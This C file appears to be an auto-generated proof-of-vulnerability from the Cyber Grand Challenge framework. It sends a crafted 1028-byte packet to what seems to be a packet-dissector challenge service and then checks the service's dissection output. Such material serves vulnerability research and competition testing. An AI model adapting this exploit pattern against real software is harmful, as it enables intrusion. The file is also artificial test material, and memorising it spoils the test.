#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xb6\x53\xce\xdb"
         "\x5c\x96\xa5\x1a\x48\xef\x20\xfe\xd4\x71\x77\x3b\xc0\xe6\x3b\xb6"
         "\xce\x00\x00\x00\x04\x9f\xbc\x7a\xb9\x29\xb2\xb9\xf4\x4c\x65\xdc"
         "\xb1\xa2\x00\x29\x5f\xc2\x45\x22\x7e\xd1\xe7\xaf\x1d\xe5\x2b\xc2"
         "\x5b\x82\x09\x2d\x54\x3b\x63\x2c\xec\xc0\xfe\x1b\x5b\x1e\x24\x1f"
         "\x34\x59\x39\xe5\x84\x1b\xb3\x0d\xbd\x64\x37\xb8\x07\xca\xe2\x3f"
         "\xad\x98\x09\x54\x42\x07\x50\x90\x2b\x43\xb4\x7a\xc2\x73\x62\x28"
         "\x3a\xf4\xa2\xc9\x23\x2c\x64\x6d\xf8\xb3\x51\xbb\x86\xc7\x8e\x07"
         "\x38\xac\x4c\xd2\x88\x1b\x4d\x23\xeb\xef\x98\x32\xaa\x9f\xa8\xfd"
         "\x71\x6d\xc7\xea\xbd\xcb\xb5\x9d\x56\x7c\xae\x52\x4d\x53\x01\xd9"
         "\x3e\xe5\xe7\x90\x5f\x6f\x3d\x15\x50\xdb\x7c\x41\x46\x34\xf1\x78"
         "\x26\x0b\xb2\x91\x27\x21\x19\x0e\x5c\xea\xea\x25\x5a\x6e\xd1\xeb"
         "\x23\x41\xd7\xc7\x24\xe7\x4f\xb6\xb3\x0d\xce\x31\x69\x12\xfd\x7c"
         "\x66\xe7\xc9\xa6\xee\x8a\x02\x2f\x80\x77\xf4\x01\x46\xc3\x5c\xfa"
         "\x39\xa6\xce\x8a\x79\x69\x1d\x88\xcd\x6d\xac\x7b\xa9\x54\xc8\x5a"
         "\x2e\xff\x63\x00\x7e\xaf\x8e\xa3\xda\x51\x11\xfc\x6d\x83\xc9\x63"
         "\x5d\x8c\x86\xe8\x2e\x56\x81\x9b\x03\x28\xbc\xe1\x4e\x4c\x94\xf2"
         "\xea\xe0\x4e\x56\x83\x36\x07\xc3\x9a\x4e\x49\xdb\xb5\x15\x85\xf9"
         "\x51\x44\x44\x59\x92\xd7\xfe\xce\x7a\x50\x43\x16\xee\x9e\xed\xaf"
         "\x60\x91\x71\x53\x45\x58\xcd\xd2\xf2\xe4\xca\x04\xbc\x9d\xa7\xe3"
         "\x98\x0f\x16\x09\xf8\x18\xf9\xdc\x29\xbf\x6a\x71\x6b\x8e\xc0\x96"
         "\xa5\x5f\x2b\x60\x29\x00\xb3\x2b\x10\x13\xcf\x2f\xd3\x7f\x84\x19"
         "\xd2\xc1\xf3\x1e\x13\xe0\x96\x7f\x2c\x92\x85\xb9\x53\x62\xcf\xba"
         "\x1e\x0a\x54\x66\xf4\xc6\xe2\x45\xfe\x10\x12\x20\xd2\x3f\x00\x07"
         "\x3b\xee\xb1\x4b\xd6\x9b\x2e\x79\x90\x18\xeb\x09\x9d\x63\xa8\x23"
         "\x82\xf7\x3c\xef\xba\x56\x77\xbc\xb1\xd8\x84\x01\xf5\xcb\x21\x4f"
         "\xda\xc6\x7e\x23\x4a\xd9\xfd\xd6\x04\xf2\x1a\xfb\x05\x7f\xfe\x65"
         "\x87\xcb\x24\x02\x54\x47\xa7\x3a\x61\x5a\x6c\x84\x17\xf2\xd3\xd3"
         "\x9a\x4a\xb6\x29\x88\xdb\x8e\x65\x85\x8a\x5d\x79\x0b\xfb\x86\x38"
         "\x92\x7b\xdf\xcb\x17\x51\x16\xbf\xfb\xb8\x7b\x87\x18\xca\x99\xb7"
         "\x62\x2e\x34\x40\x3d\x47\x2a\xcc\x45\xb7\xbb\xa2\xc8\xb2\x21\xf8"
         "\xc6\xcb\x00\x91\x97\xaf\x64\x8c\x79\xfe\x5e\x14\x97\xb6\xb3\x9b"
         "\x41\xae\x75\x8d\x34\x0c\x3e\x81\x52\xd5\xa6\x58\x98\x0d\xc7\xac"
         "\xc4\x3d\xb1\xf0\x53\x34\x3d\x9c\x49\x26\x45\x33\xe4\x81\x21\xa8"
         "\x2b\x11\x0a\x5f\x04\xef\x28\xe4\x2a\xa4\xaa\x9a\xb8\x19\xf5\x88"
         "\xea\x76\x46\xe9\x82\x22\xbe\x05\xd5\x6a\xe9\xef\x49\xcc\xae\xb4"
         "\x5b\x55\x04\x27\xea\x05\xe1\xbb\xca\x91\xda\x71\x7e\x56\xce\x00"
         "\xca\x24\xaf\x80\x8e\x98\x16\xef\x89\xaf\x1e\x24\x7f\x78\xc1\x72"
         "\xd0\x9b\x3d\xdb\x97\xcf\x7f\x60\x62\x2a\x20\x36\xaf\xe8\xb3\x2f"
         "\x98\x65\x07\x71\x1a\x58\xdd\xbf\xe2\x7e\xf3\xf5\x21\x0f\xbf\x7b"
         "\x99\x25\x63\x2c\x65\x09\x44\xca\x5b\x32\x06\x9a\xe0\xb2\xa2\x24"
         "\x87\xe5\x08\x98\x7a\xef\x95\xc2\x58\xfc\xbd\x65\xea\x58\x58\xfb"
         "\x09\x2e\x04\x04\x00\x04\x83\x25\xdf\x93\xf3\x75\xe5\x8b\x90\x56"
         "\xfc\x95\x08\xec\x04\xd5\x94\xdd\x97\xf5\xec\x1d\xd8\x36\x56\x02"
         "\x91\xbe\x7f\x92\x4a\xd0\x55\x33\x5a\x37\xdf\x50\x8c\xd8\xc6\x87"
         "\x74\x06\x72\x10\x26\x33\xbf\x6d\xca\x92\xba\xb9\x51\x18\x60\x73"
         "\x55\x47\xce\x00\xc1\xe3\xc9\x44\xb6\x19\x68\x00\x2f\x06\xf7\xa0"
         "\x9e\xd9\xb4\xd1\x4f\x9c\x4e\xd7\xca\x95\xa7\x8f\x60\x1d\xfb\x4a"
         "\x82\xd5\x3b\xa8\x5c\x8e\xdb\x51\x8d\x35\xe9\x16\x61\x4d\x62\xb6"
         "\x8a\xf2\x61\x18\xe4\x12\x99\x9a\xd1\x10\xe7\xa5\x33\x36\x13\xa1"
         "\xa7\xe4\x34\xa5\x3d\x3f\x6c\x4f\xf6\x1a\x99\x5f\xaa\x6d\x59\x98"
         "\xcf\x0f\x98\x10\x9e\x0b\x3d\xbe\x30\x5b\x76\xfc\xb6\x95\x6b\x5a"
         "\x99\x63\xf8\x83\x8d\x00\x9c\xdc\x11\xac\x0f\xf8\x2f\xb6\xee\x2c"
         "\xe3\xbe\xa1\x35\x41\x82\xf1\x79\xb1\xb7\xdd\x0b\x36\x5f\x55\x14"
         "\xcc\xff\xcb\xa4\x86\x95\x25\x99\xee\x96\xb8\xea\x37\x64\xe0\xa2"
         "\x03\x99\xa1\x5d\x6e\x7c\x92\xc6\x82\x95\x34\x73\x3a\xf6\x88\x6a"
         "\x39\xbf\x78\x86\x67\x6e\xc4\x63\x22\x45\x3d\x86\x77\xa2\xa7\x96"
         "\x8b\x4e\x9e\x56\xd6\x1d\xdc\xfe\xc5\xe9\x07\x19\x45\x5c\xaf\xd7"
         "\x0e\xda\x44\xc9\xd4\xac\xb1\x0c\xf6\x59\x81\x88\xac\x41\x33\xcf"
         "\xd9\x58\x08\x66\x03\x1f\x3d\x6e\x55\xaf\x59\x21\x5a\xae\x98\x80"
         "\x84\x3b\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===Lithosiinaecoequation
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x4c\x69\x74\x68\x6f\x73\x69\x69\x6e\x61\x65"
         "\x63\x6f\x65\x71\x75\x61\x74\x69\x6f\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
